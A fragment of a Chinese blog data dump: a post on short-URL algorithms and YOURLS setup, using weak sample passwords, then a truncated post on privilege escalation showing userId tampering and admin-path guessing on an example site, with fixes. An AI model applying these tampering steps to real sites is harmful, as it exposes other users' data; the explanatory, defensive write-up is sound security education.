title=\"短链作用\"></a>短链作用</h3><ul>\n<li>缩短原链接长度，便于营销推广</li>\n<li>数据统计，在重定向的过程中进行PV、UV等数据统计</li>\n<li>屏蔽原链接域名</li>\n</ul>\n<h3 id=\"301-amp-302\"><a href=\"#301-amp-302\" class=\"headerlink\" title=\"301&amp;302\"></a>301&amp;302</h3><p>301 是永久重定向,302 是临时重定向.短地址一经生成就不会变化,所以用 301 是符合 HTTP 语义的.同时对服务器压力也会有一定减少. 但是如果使用了 301,我们就无法统计到短地址被点击的次数了.而这个点击次数是一个非常有意思的大数据分析数据源.能够分析出的东西非常非常多.所以选择302虽然会增加服务器压力.</p>\n<h2 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h2><h3 id=\"自增算法\"><a href=\"#自增算法\" class=\"headerlink\" title=\"自增算法\"></a>自增算法</h3><p>不重复算法:<br>设置一个10进制的自增变量x,生成短链接时将其转换为62进制的数值,该数值便作为短链接,下次生成短链接则x+1.该算法运用了低进制转高进制,字符数会变少的原理.<br>十进制 2020,对应不同进制的字符表示:</p>\n<p><img src=\"/images/short_url/jinzhi.png\"></p>\n<p><a href=\"https://tool.lu/hexconvert/\">进制在线转换工具</a></p>\n<h3 id=\"Hash算法\"><a href=\"#Hash算法\" class=\"headerlink\" title=\"Hash算法\"></a>Hash算法</h3><p>MD5消息摘要算法 （英语：MD5 Message-Digest Algorithm）,一种被广泛使用的密码散列函数用于确保信息传输完整一致.MD5 加密后的位数一般为两种,16 位与32 位,这里我们使用32位.</p>\n<h4 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h4><ul>\n<li>将长网址 md5 生成 32 位签名串,分为 4 段,每段 8 个字节.</li>\n<li>对这四段循环处理, 取 8 个字节,将他看成 16 进制串与 0x3fffffff(30位1) 与操作,即超过 30 位的忽略处理.</li>\n<li>这 30 位分成 6 段,每 5 位的数字作为字母表的索引取得特定字符,依次进行获得 6 位字符串.</li>\n<li>总的 md5 串可以获得4个6位串,取里面的任意一个就可作为这个长 url 的短URL地址.</li>\n</ul>\n<h2 id=\"YOURLS介绍\"><a href=\"#YOURLS介绍\" class=\"headerlink\" title=\"YOURLS介绍\"></a>YOURLS介绍</h2><p>YOURLS (Your Own URL Shortener) 一款开源PHP程序,实现短网址生成系统.而无需第三方平台你就可以获得所有的数据统计,并且支持一系列插件扩展&lt;可单独写&gt;.<br><a href=\"https://yourls.org/\">官网</a><br><a href=\"https://github.com/YOURLS/YOURLS\">Github项目</a></p>\n<h3 id=\"YOURLS特点\"><a href=\"#YOURLS特点\" class=\"headerlink\" title=\"YOURLS特点\"></a>YOURLS特点</h3><ul>\n<li>安装简单</li>\n<li>私有或公共均可</li>\n<li>支持默认的数字顺序、指定关键字两种方式生成.</li>\n<li>轻松创建和分享链接</li>\n<li>历史点击报告、来源追踪、访客地理位置</li>\n<li>支持API</li>\n</ul>\n<h2 id=\"YOURLS搭建\"><a href=\"#YOURLS搭建\" class=\"headerlink\" title=\"YOURLS搭建\"></a>YOURLS搭建</h2><h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><ul>\n<li>LAMP/LNMP环境WAMP等均可</li>\n<li>YOURLS源码</li>\n</ul>\n<h3 id=\"源码下载\"><a href=\"#源码下载\" class=\"headerlink\" title=\"源码下载\"></a>源码下载</h3><p><a href=\"https://github.com/YOURLS/YOURLS\">YOURLS</a></p>\n<h3 id=\"配置文档\"><a href=\"#配置文档\" class=\"headerlink\" title=\"配置文档\"></a>配置文档</h3><p>YOURLS配置文档在user目录下的config-sample.php内,提前拷贝并修改文件为config.php.</p>\n<p><img src=\"/images/short_url/config.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_USER&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span> ); <span class=\"comment\">//数据库账户</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_PASS&#x27;</span>, <span class=\"string\">&#x27;123456&#x27;</span> ); <span class=\"comment\">//数据库密码</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_NAME&#x27;</span>, <span class=\"string\">&#x27;yourls&#x27;</span> ); <span class=\"comment\">//YOURLS数据库名</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_HOST&#x27;</span>, <span class=\"string\">&#x27;localhost&#x27;</span> ); <span class=\"comment\">//数据库地址</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_PREFIX&#x27;</span>, <span class=\"string\">&#x27;yourls_&#x27;</span> ); <span class=\"comment\">//数据库前缀</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_SITE&#x27;</span>, <span class=\"string\">&#x27;http://yourls.me:4444&#x27;</span> );<span class=\"comment\">//服务器域名,短地址也是基于这个生成,一定不能写错,不然会报错.</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_HOURS_OFFSET&#x27;</span>, <span class=\"string\">&#x27;+8&#x27;</span>); 　　　<span class=\"comment\">//时区偏移,默认即可.</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_LANG&#x27;</span>, <span class=\"string\">&#x27;zh_CN&#x27;</span> ); 　　　　　<span class=\"comment\">//默认为英文,没有中文包,需要自己去 https://github.com/guox/yourls-zh_CN/下载,放到user/languages目录下</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_UNIQUE_URLS&#x27;</span>, <span class=\"literal\">true</span> );　　　<span class=\"comment\">//短地址是否唯一</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_PRIVATE&#x27;</span>, <span class=\"literal\">true</span> ); <span class=\"comment\">//是否私有,如果私有的,在进行api调用生成短地址时需要传递用户名和密码(默认即可)</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_COOKIEKEY&#x27;</span>, <span class=\"string\">&#x27;A2C7&amp;H~r80pTps&#123;nIfI8VFpTxnfF3c)j@J#&#123;nDUh&#x27;</span> );<span class=\"comment\">//加密cookie 去 http://yourls.org/cookie 获取</span></span><br><span class=\"line\">$yourls_user_passwords = <span class=\"keyword\">array</span>( <span class=\"string\">&#x27;admin&#x27;</span> =&gt; <span class=\"string\">&#x27;123456&#x27;</span> <span class=\"comment\">/* Password encrypted by YOURLS */</span>; <span class=\"comment\">//用户名=&gt;密码 可填多个 登录成功后这里的明文密码会被加密 );</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DEBUG&#x27;</span>, <span class=\"literal\">false</span> );　　　　　　<span class=\"comment\">//是否开启调试</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_URL_CONVERT&#x27;</span>, <span class=\"number\">62</span> );　　　　<span class=\"comment\">//使用36进制 还是62进制 这个最好一开始设好不要修改，避免地址冲突，建议62进制</span></span><br><span class=\"line\">$yourls_reserved_URL = <span class=\"keyword\">array</span>( <span class=\"string\">&#x27;porn&#x27;</span>, <span class=\"string\">&#x27;faggot&#x27;</span>, <span class=\"string\">&#x27;sex&#x27;</span>, <span class=\"string\">&#x27;nigger&#x27;</span>, <span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;cunt&#x27;</span>, <span class=\"string\">&#x27;dick&#x27;</span>, <span class=\"comment\">//排除一下短地址，这些地址是不会生成的 );</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>访问提醒数据库</strong></li>\n</ul>\n<p>注意:须提前新建数据库,不然会报错.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//yourls.me:4444/admin/</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/short_url/db_error.png\"></p>\n<center>先新建数据库</center>\n- **新建数据库**\n\n<p><img src=\"/images/short_url/create_yourls.png\"></p>\n<ul>\n<li><strong>Install</strong></li>\n</ul>\n<p>新建数据库后刷新网页即可显示如下图所示:<br><img src=\"/images/short_url/install.png\"><br>默认生成文件及表等信息.<br><img src=\"/images/short_url/success_.png\"></p>\n<ul>\n<li><strong>系统登录</strong></li>\n</ul>\n<p>可登录多个账户(配置文件中添加).<br><img src=\"/images/short_url/login.png\"><br><img src=\"/images/short_url/login_index.png\"></p>\n<ul>\n<li><strong>新建短链</strong></li>\n</ul>\n<p>输入长链和关键字,关键字部分可省略,默认会是数字顺序添加.<br><img src=\"/images/short_url/url_create.png\"><br><img src=\"/images/short_url/short_urls.png\"></p>\n<ul>\n<li><strong>访问实战</strong></li>\n</ul>\n<p><img src=\"/images/short_url/yourls.gif\"></p>\n<h2 id=\"API使用\"><a href=\"#API使用\" class=\"headerlink\" title=\"API使用\"></a>API使用</h2><p>yourls 提供了丰富的API,使用自身的API可以实现:</p>\n<ol>\n<li>生成或获取短链</li>\n<li>获取短链的统计信息</li>\n<li>以 JSON, XML 或者纯文本输出</li>\n<li>通过用户名密码或者安全的无密码token机制授权<br>介绍配置文件时已经说明,如果想私有,就需要进行签名后才能使用API.</li>\n</ol>\n<p><img src=\"/images/short_url/api.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//yourls.me:4444/yourls-api.php</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h3><p>两种方式获得授权,一种是使用 username/password 对发送请求,但这种方式导致用户名密码在传输过程中被截取泄露;另一种方式是使用不需要密码的 token 机制,在 admin/tools.php 页面会产生当前用户的验证token;<br>动作 action 参数有很多个选项:</p>\n<ul>\n<li>shorturl 获取链接的短链接<br>在使用了值之后，另外两个参数</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `url` 用来缩短的原始链接</span><br><span class=\"line\">- `keyword` 或者 `title` 可选参数，用来自定义短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>expand 获取短链接的原始长链接<br>将短链接展开</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `shorturl` 值可以为 `abc` 或者完整的短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>url-stats 获取短链接的信息<br>短链接的统计信息</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `shorturl` 值可以为 `abc` 或者完整的短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>stats 获取链接的信息<br>获取链接的信息</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `filter` 值可以为 `top`, `bottom`, `rand`, `last`</span><br><span class=\"line\">- `limit` 返回的数量</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>db-stats 获取全局的链接和点击数</p>\n</li>\n<li><p>输出格式 format 参数用来指定API输出的格式</p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jsonp</span><br><span class=\"line\">json</span><br><span class=\"line\">xml</span><br><span class=\"line\">simple</span><br></pre></td></tr></table></figure>\n<h3 id=\"API生成短链\"><a href=\"#API生成短链\" class=\"headerlink\" title=\"API生成短链\"></a>API生成短链</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X POST \\</span><br><span class=\"line\">http://yourls.me:4444/yourls-api.php \\</span><br><span class=\"line\">-F signature=3f5bd1d9a2 \\</span><br><span class=\"line\">-F action=shorturl \\</span><br><span class=\"line\">-F url=http://www.si1ent.xyz/2020/05/16/index.html \\</span><br><span class=\"line\">-F format=json</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/short_url/curl.png\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//hufangyun.com/2017/short-url/</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/d7c1edc0836e</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>短链(Short URL)即为短网址,主要包含域名加部分字符(这类字符中包含指定的数字或a-z、A-Z、0-9随机生成的字符),因其较短而无需冗长的链接,同时也帮助我们解决了因字符长度限制而闻名.</p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>当浏览器中输入:<code>http://yourls.me:4444/1</code>时.</p>\n<ul>\n<li>DNS首先解析获得的 <code>http://yourls.me:4444 </code>IP地址</li>\n<li>当 DNS获得IP地址以后（比如：192.168.3.12）,会向这个地址发送 HTTP GET 请求，查询短码”1”.</li>\n<li><code>http://yourls.me:4444</code> 服务器会通过短码“1”获取对应的长 URL</li>\n<li>请求通过 HTTP 301 转到对应的长 URL <code>http://www.si1ent.xyz/2019/03/05/hello-world/</code></li>\n</ul>\n<h3 id=\"短链作用\"><a href=\"#短链作用\" class=\"headerlink\" title=\"短链作用\"></a>短链作用</h3><ul>\n<li>缩短原链接长度，便于营销推广</li>\n<li>数据统计，在重定向的过程中进行PV、UV等数据统计</li>\n<li>屏蔽原链接域名</li>\n</ul>\n<h3 id=\"301-amp-302\"><a href=\"#301-amp-302\" class=\"headerlink\" title=\"301&amp;302\"></a>301&amp;302</h3><p>301 是永久重定向,302 是临时重定向.短地址一经生成就不会变化,所以用 301 是符合 HTTP 语义的.同时对服务器压力也会有一定减少. 但是如果使用了 301,我们就无法统计到短地址被点击的次数了.而这个点击次数是一个非常有意思的大数据分析数据源.能够分析出的东西非常非常多.所以选择302虽然会增加服务器压力.</p>\n<h2 id=\"算法实现\"><a href=\"#算法实现\" class=\"headerlink\" title=\"算法实现\"></a>算法实现</h2><h3 id=\"自增算法\"><a href=\"#自增算法\" class=\"headerlink\" title=\"自增算法\"></a>自增算法</h3><p>不重复算法:<br>设置一个10进制的自增变量x,生成短链接时将其转换为62进制的数值,该数值便作为短链接,下次生成短链接则x+1.该算法运用了低进制转高进制,字符数会变少的原理.<br>十进制 2020,对应不同进制的字符表示:</p>\n<p><img src=\"/images/short_url/jinzhi.png\"></p>\n<p><a href=\"https://tool.lu/hexconvert/\">进制在线转换工具</a></p>\n<h3 id=\"Hash算法\"><a href=\"#Hash算法\" class=\"headerlink\" title=\"Hash算法\"></a>Hash算法</h3><p>MD5消息摘要算法 （英语：MD5 Message-Digest Algorithm）,一种被广泛使用的密码散列函数用于确保信息传输完整一致.MD5 加密后的位数一般为两种,16 位与32 位,这里我们使用32位.</p>\n<h4 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h4><ul>\n<li>将长网址 md5 生成 32 位签名串,分为 4 段,每段 8 个字节.</li>\n<li>对这四段循环处理, 取 8 个字节,将他看成 16 进制串与 0x3fffffff(30位1) 与操作,即超过 30 位的忽略处理.</li>\n<li>这 30 位分成 6 段,每 5 位的数字作为字母表的索引取得特定字符,依次进行获得 6 位字符串.</li>\n<li>总的 md5 串可以获得4个6位串,取里面的任意一个就可作为这个长 url 的短URL地址.</li>\n</ul>\n<h2 id=\"YOURLS介绍\"><a href=\"#YOURLS介绍\" class=\"headerlink\" title=\"YOURLS介绍\"></a>YOURLS介绍</h2><p>YOURLS (Your Own URL Shortener) 一款开源PHP程序,实现短网址生成系统.而无需第三方平台你就可以获得所有的数据统计,并且支持一系列插件扩展&lt;可单独写&gt;.<br><a href=\"https://yourls.org/\">官网</a><br><a href=\"https://github.com/YOURLS/YOURLS\">Github项目</a></p>\n<h3 id=\"YOURLS特点\"><a href=\"#YOURLS特点\" class=\"headerlink\" title=\"YOURLS特点\"></a>YOURLS特点</h3><ul>\n<li>安装简单</li>\n<li>私有或公共均可</li>\n<li>支持默认的数字顺序、指定关键字两种方式生成.</li>\n<li>轻松创建和分享链接</li>\n<li>历史点击报告、来源追踪、访客地理位置</li>\n<li>支持API</li>\n</ul>\n<h2 id=\"YOURLS搭建\"><a href=\"#YOURLS搭建\" class=\"headerlink\" title=\"YOURLS搭建\"></a>YOURLS搭建</h2><h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><ul>\n<li>LAMP/LNMP环境WAMP等均可</li>\n<li>YOURLS源码</li>\n</ul>\n<h3 id=\"源码下载\"><a href=\"#源码下载\" class=\"headerlink\" title=\"源码下载\"></a>源码下载</h3><p><a href=\"https://github.com/YOURLS/YOURLS\">YOURLS</a></p>\n<h3 id=\"配置文档\"><a href=\"#配置文档\" class=\"headerlink\" title=\"配置文档\"></a>配置文档</h3><p>YOURLS配置文档在user目录下的config-sample.php内,提前拷贝并修改文件为config.php.</p>\n<p><img src=\"/images/short_url/config.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_USER&#x27;</span>, <span class=\"string\">&#x27;root&#x27;</span> ); <span class=\"comment\">//数据库账户</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_PASS&#x27;</span>, <span class=\"string\">&#x27;123456&#x27;</span> ); <span class=\"comment\">//数据库密码</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_NAME&#x27;</span>, <span class=\"string\">&#x27;yourls&#x27;</span> ); <span class=\"comment\">//YOURLS数据库名</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_HOST&#x27;</span>, <span class=\"string\">&#x27;localhost&#x27;</span> ); <span class=\"comment\">//数据库地址</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DB_PREFIX&#x27;</span>, <span class=\"string\">&#x27;yourls_&#x27;</span> ); <span class=\"comment\">//数据库前缀</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_SITE&#x27;</span>, <span class=\"string\">&#x27;http://yourls.me:4444&#x27;</span> );<span class=\"comment\">//服务器域名,短地址也是基于这个生成,一定不能写错,不然会报错.</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_HOURS_OFFSET&#x27;</span>, <span class=\"string\">&#x27;+8&#x27;</span>); 　　　<span class=\"comment\">//时区偏移,默认即可.</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_LANG&#x27;</span>, <span class=\"string\">&#x27;zh_CN&#x27;</span> ); 　　　　　<span class=\"comment\">//默认为英文,没有中文包,需要自己去 https://github.com/guox/yourls-zh_CN/下载,放到user/languages目录下</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_UNIQUE_URLS&#x27;</span>, <span class=\"literal\">true</span> );　　　<span class=\"comment\">//短地址是否唯一</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_PRIVATE&#x27;</span>, <span class=\"literal\">true</span> ); <span class=\"comment\">//是否私有,如果私有的,在进行api调用生成短地址时需要传递用户名和密码(默认即可)</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_COOKIEKEY&#x27;</span>, <span class=\"string\">&#x27;A2C7&amp;H~r80pTps&#123;nIfI8VFpTxnfF3c)j@J#&#123;nDUh&#x27;</span> );<span class=\"comment\">//加密cookie 去 http://yourls.org/cookie 获取</span></span><br><span class=\"line\">$yourls_user_passwords = <span class=\"keyword\">array</span>( <span class=\"string\">&#x27;admin&#x27;</span> =&gt; <span class=\"string\">&#x27;123456&#x27;</span> <span class=\"comment\">/* Password encrypted by YOURLS */</span>; <span class=\"comment\">//用户名=&gt;密码 可填多个 登录成功后这里的明文密码会被加密 );</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_DEBUG&#x27;</span>, <span class=\"literal\">false</span> );　　　　　　<span class=\"comment\">//是否开启调试</span></span><br><span class=\"line\">define( <span class=\"string\">&#x27;YOURLS_URL_CONVERT&#x27;</span>, <span class=\"number\">62</span> );　　　　<span class=\"comment\">//使用36进制 还是62进制 这个最好一开始设好不要修改，避免地址冲突，建议62进制</span></span><br><span class=\"line\">$yourls_reserved_URL = <span class=\"keyword\">array</span>( <span class=\"string\">&#x27;porn&#x27;</span>, <span class=\"string\">&#x27;faggot&#x27;</span>, <span class=\"string\">&#x27;sex&#x27;</span>, <span class=\"string\">&#x27;nigger&#x27;</span>, <span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;cunt&#x27;</span>, <span class=\"string\">&#x27;dick&#x27;</span>, <span class=\"comment\">//排除一下短地址，这些地址是不会生成的 );</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>访问提醒数据库</strong></li>\n</ul>\n<p>注意:须提前新建数据库,不然会报错.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//yourls.me:4444/admin/</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/short_url/db_error.png\"></p>\n<center>先新建数据库</center>\n- **新建数据库**\n\n<p><img src=\"/images/short_url/create_yourls.png\"></p>\n<ul>\n<li><strong>Install</strong></li>\n</ul>\n<p>新建数据库后刷新网页即可显示如下图所示:<br><img src=\"/images/short_url/install.png\"><br>默认生成文件及表等信息.<br><img src=\"/images/short_url/success_.png\"></p>\n<ul>\n<li><strong>系统登录</strong></li>\n</ul>\n<p>可登录多个账户(配置文件中添加).<br><img src=\"/images/short_url/login.png\"><br><img src=\"/images/short_url/login_index.png\"></p>\n<ul>\n<li><strong>新建短链</strong></li>\n</ul>\n<p>输入长链和关键字,关键字部分可省略,默认会是数字顺序添加.<br><img src=\"/images/short_url/url_create.png\"><br><img src=\"/images/short_url/short_urls.png\"></p>\n<ul>\n<li><strong>访问实战</strong></li>\n</ul>\n<p><img src=\"/images/short_url/yourls.gif\"></p>\n<h2 id=\"API使用\"><a href=\"#API使用\" class=\"headerlink\" title=\"API使用\"></a>API使用</h2><p>yourls 提供了丰富的API,使用自身的API可以实现:</p>\n<ol>\n<li>生成或获取短链</li>\n<li>获取短链的统计信息</li>\n<li>以 JSON, XML 或者纯文本输出</li>\n<li>通过用户名密码或者安全的无密码token机制授权<br>介绍配置文件时已经说明,如果想私有,就需要进行签名后才能使用API.</li>\n</ol>\n<p><img src=\"/images/short_url/api.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//yourls.me:4444/yourls-api.php</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h3><p>两种方式获得授权,一种是使用 username/password 对发送请求,但这种方式导致用户名密码在传输过程中被截取泄露;另一种方式是使用不需要密码的 token 机制,在 admin/tools.php 页面会产生当前用户的验证token;<br>动作 action 参数有很多个选项:</p>\n<ul>\n<li>shorturl 获取链接的短链接<br>在使用了值之后，另外两个参数</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `url` 用来缩短的原始链接</span><br><span class=\"line\">- `keyword` 或者 `title` 可选参数，用来自定义短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>expand 获取短链接的原始长链接<br>将短链接展开</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `shorturl` 值可以为 `abc` 或者完整的短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>url-stats 获取短链接的信息<br>短链接的统计信息</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `shorturl` 值可以为 `abc` 或者完整的短链接</span><br></pre></td></tr></table></figure>\n<ul>\n<li>stats 获取链接的信息<br>获取链接的信息</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- `filter` 值可以为 `top`, `bottom`, `rand`, `last`</span><br><span class=\"line\">- `limit` 返回的数量</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>db-stats 获取全局的链接和点击数</p>\n</li>\n<li><p>输出格式 format 参数用来指定API输出的格式</p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jsonp</span><br><span class=\"line\">json</span><br><span class=\"line\">xml</span><br><span class=\"line\">simple</span><br></pre></td></tr></table></figure>\n<h3 id=\"API生成短链\"><a href=\"#API生成短链\" class=\"headerlink\" title=\"API生成短链\"></a>API生成短链</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X POST \\</span><br><span class=\"line\">http://yourls.me:4444/yourls-api.php \\</span><br><span class=\"line\">-F signature=3f5bd1d9a2 \\</span><br><span class=\"line\">-F action=shorturl \\</span><br><span class=\"line\">-F url=http://www.si1ent.xyz/2020/05/16/index.html \\</span><br><span class=\"line\">-F format=json</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/short_url/curl.png\"></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//hufangyun.com/2017/short-url/</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/d7c1edc0836e</span></span><br></pre></td></tr></table></figure>"},{"title":"越权访问","date":"2019-12-06T01:45:46.000Z","_content":"可访问/修改未授权内敏感信息；而造成这一隐患的主要原因就是权限控制不严，导致普通账户可访问/修改未授权敏感信息。下面根据两个示例来简单介绍下:\n\n## 越权分类\n\n#### 横向越权\n\n横向：是指用户可查看/修改同用户级别下的信息.\n\n位置：经常出现用户登后,查看个人信息或修改个人信息处通过修改user_id类的参数来实现横向越权.\n\n#### 纵向越权\n\n纵向：是指用户可查看/修改用户级别更高一级或管理员才具有的权限.\n\n位置：用户目录信息查看,可通过修改路径来获取更多敏感信息.\n\n以下将结合两个示例来具体介绍:\n\n### 漏洞位置\n\n1. 用户登陆后个人信息查看/修改处\n2. 用户登陆后输入其他路径或文件名获取敏感信息\n3. 等等\n\n### 实战\n\n#### 横向实战\n\n1.用户注册并登陆，并查看JS被是否包含一些tips\n\n![](/images/yq/zc.png)\n\n2.根据用户访问后的URL\n\n```php\nhttps://www.test.com.cn/user?loginUserId=&optType=1&userId=1\n```\n\n![](/images/yq/uid.png)\n\n3.修改userid获取其他账户信息\n\n```php+HTML\nhttps://www.test.com.cn/user?loginUserId=893&optType=1&userId=893\n```\n\n![](/images/yq/other_id.png)\n\n#### 纵向实战\n\n1.普通账户登陆，发现普通账户仅有部分权限\n\n![](/images/yq/login.png)\n\n2.查看JS\n\n![](/images/yq/js.png)\n\n3.修改URL,并访问\n\n```php+HTML\nhttps://www.test.com.cn/test/test1/administrator-list\n```\n\n![](/images/yq/administrator.png)\n\n### 加固建议\n\n1. 用户权限严格控制\n2. 执行关键操作前必须验证用户身份\n3. 直接对象引用的加密资源id,防止攻击者枚举ID\n4. 前后端同时校验\n5. 